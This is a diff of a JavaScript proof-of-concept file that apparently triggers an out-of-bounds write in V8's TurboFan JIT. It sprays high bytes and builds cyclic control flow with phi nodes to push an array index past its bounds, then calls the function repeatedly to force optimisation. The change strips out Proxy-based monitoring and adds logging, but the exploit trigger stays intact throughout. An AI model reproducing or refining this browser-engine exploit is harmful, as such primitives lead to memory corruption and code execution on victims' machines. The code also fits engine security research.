@@ -1,46 +1,6 @@
-// Handler for the Proxy to intercept set operations
-// Function to execute the for loop
-function monitorOobArray() {
-  for (let i = 0; i < oob_array.length + 10; i++) { // Extend the loop to check beyond
-    console.log(`Index ${i}:`, oob_array[i]);
-  }
-}
+// script.js
 
-// Set the interval to 5 milliseconds
-const intervalId = setInterval(monitorOobArray, 1);
-
-setTimeout(() => {
-  clearInterval(intervalId);
-  console.log('Stopped monitoring oob_array.');
-}, 100); // 10000 milliseconds = 10 seconds
-
-
-
-const handler = {
-  set(target, property, value) {
-    const index = Number(property);
-    if (!isNaN(index)) {
-      if (index < 0 || index >= target.length) {
-        console.warn(`Out-of-Bounds Write Detected: Attempting to set index ${index} to ${value}`);
-      } else {
-        console.log(`Setting index ${index} to ${value}`);
-      }
-    } else {
-      console.log(`Setting property ${property} to ${value}`);
-    }
-    return Reflect.set(target, property, value);
-  }
-};
-
-
-
-// Initialize the proxied oob_array
-var oob_array = new Proxy(new Array(5), handler);
-
-// Rest of your PoC code remains the same
-var arrx = new Array(150);
-arrx[0] = 1.1;
-
+// Define fake as a Typed Array globally
 var fake = new Uint32Array(10);
 fake[0] = 1;
 fake[1] = 3;
@@ -51,47 +11,68 @@ fake[5] = 6;
 fake[6] = 7;
 fake[7] = 8;
 fake[8] = 9;
+fake[9] = 10; // Complete the array
 
 var tahir = 0x1;
 
+// Define oob_array globally as a Uint32Array with a fixed length of 10
+// Adjust the length as needed based on your application's requirements
+var oob_array = new Uint32Array(10);
+oob_array.fill(0); // Initialize all elements to 0
+
+console.log("script.js has been loaded.");
+console.info("oob_array initialized globally.");
+
+// Function to manipulate the global oob_array
 function poc(a) {
+  // Initialize or reset oob_array[0] if needed
   oob_array[0] = 0x500;
+  
   let just_a_variable = fake[0];
   let another_variable3 = fake[7];
-  if (a % 7 == 0)
-    another_variable3 = 0xff00000000; // spray high bytes
+  
+  if (a % 7 === 0) {
+    another_variable3 = 0xff00000000; // Spray high bytes
+  }
+  
   another_variable3 = Math.max(another_variable3, tahir);
   another_variable3 = another_variable3 >>> 0;
+  
   var index = fake[3];
   var for_phi_modes = fake[6];
   let c = fake[1];
   
-  // Giant loop for generating cyclic graph
+  // Giant loop to generate cyclic graph
   for (var i = 0; i < 10; i++) {
-    if (a % 3 == 0) {
+    if (a % 3 === 0) {
       just_a_variable = c;
     }
-    if (a % 37 == 0) {
+    if (a % 37 === 0) {
       just_a_variable = fake[2];
     }
-    if (a % 11 == 0) {
+    if (a % 11 === 0) {
       just_a_variable = fake[8];
     }
-    if (a % 17 == 0) {
+    if (a % 17 === 0) {
       just_a_variable = fake[5];
     }
-    if (a % 19 == 0) {
+    if (a % 19 === 0) {
       just_a_variable = fake[4];
     }
-    if (a % 7 == 0 && i >= 5) {
+    if (a % 7 === 0 && i >= 5) {
       for_phi_modes = just_a_variable;
       just_a_variable = another_variable3;
     }
     if (i >= 6) {
       for (let j = 0; j < 5; j++) {
-        if (a % 5 == 0) {
+        if (a % 5 === 0) {
           index = for_phi_modes;
-          oob_array[index] = 0x500; // zero extends before getting value
+          try {
+            oob_array[index] = 0x500; // Attempting OOB write
+            console.log(`oob_array[${index}] set to 0x500`);
+          } catch (e) {
+            console.error(`OOB Write Attempted: ${e.message}`);
+          }
         }
       }
     }
@@ -103,13 +84,10 @@ function poc(a) {
   return [index, BigInt(just_a_variable)];
 }
 
-
+// Loop to execute poc multiple times
 for (let i = 2; i < 0x500; i++) {
-  poc(i); // Compile using turbofan
+  poc(i); // Compile using Turbofan (JavaScript engine)
 }
 
-for (let i = 0; i < oob_array.length + 10; i++) { // Extend the loop to check beyond
-  console.log(`Index ${i}:`, oob_array[i]);
-}
-
+// Final call to poc with a specific value
 poc(7 * 5);
